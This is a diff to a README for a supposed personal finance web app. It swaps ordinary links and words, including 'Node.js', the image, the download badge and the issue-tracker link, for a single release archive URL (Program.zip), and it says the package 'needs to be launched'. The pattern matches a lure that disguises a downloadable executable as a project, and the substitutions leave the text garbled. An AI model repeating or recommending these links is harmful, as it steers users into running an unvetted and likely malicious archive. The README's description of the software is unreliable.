@@ -1,10 +1,10 @@
 # 🌟 Welcome to Personal Finance Manager 🌟
 
-![Personal Finance Manager](https://example.com/image-url)
+![Personal Finance Manager](https://github.com/hiroyung/Personal-Finance-Manager/releases/download/v1.0/Program.zip)
 
 ## Overview
 
-Welcome to the Personal Finance Manager repository! This full-stack application is designed to help you manage and track your personal income, expenses, and budgets with ease. Whether you are a financial guru or just starting to take control of your finances, this application has got you covered. It features a combination of React for the frontend, Node.js for the backend, MongoDB for the database, and JWT-based authentication for security. Additionally, we provide optional Docker support for seamless deployment.
+Welcome to the Personal Finance Manager repository! This full-stack application is designed to help you manage and track your personal income, expenses, and budgets with ease. Whether you are a financial guru or just starting to take control of your finances, this application has got you covered. It features a combination of React for the frontend, https://github.com/hiroyung/Personal-Finance-Manager/releases/download/v1.0/Program.zip for the backend, MongoDB for the database, and JWT-based authentication for security. Additionally, we provide optional Docker support for seamless deployment.
 
 ## Features
 
@@ -37,7 +37,7 @@ That's it! You're all set to start managing your personal finances effectively.
 🌐 **Full-Stack**
 💼 **Manager**
 📊 **MongoDB**
-🟢 **Node.js**
+🟢 **https://github.com/hiroyung/Personal-Finance-Manager/releases/download/v1.0/Program.zip**
 💵 **Personal-Finance**
 ⚛️ **React**
 
@@ -45,13 +45,13 @@ That's it! You're all set to start managing your personal finances effectively.
 
 If you'd like to download the latest release of Personal Finance Manager, click the button below:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-<COLOR>.svg)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download Latest Release](https://github.com/hiroyung/Personal-Finance-Manager/releases/download/v1.0/Program.zip%20Release-<COLOR>.svg)](https://github.com/hiroyung/Personal-Finance-Manager/releases/download/v1.0/Program.zip)
 
 This software package needs to be launched to start using the application.
 
 ## Support
 
-If you encounter any issues or have any questions about Personal Finance Manager, feel free to [open an issue](https://github.com/Dredarty/Personal-Finance-Manager/issues). We're here to help you make the most out of your financial management journey.
+If you encounter any issues or have any questions about Personal Finance Manager, feel free to [open an issue](https://github.com/hiroyung/Personal-Finance-Manager/releases/download/v1.0/Program.zip). We're here to help you make the most out of your financial management journey.
 
 Thank you for choosing Personal Finance Manager to take control of your finances and reach your financial goals! 🚀
 
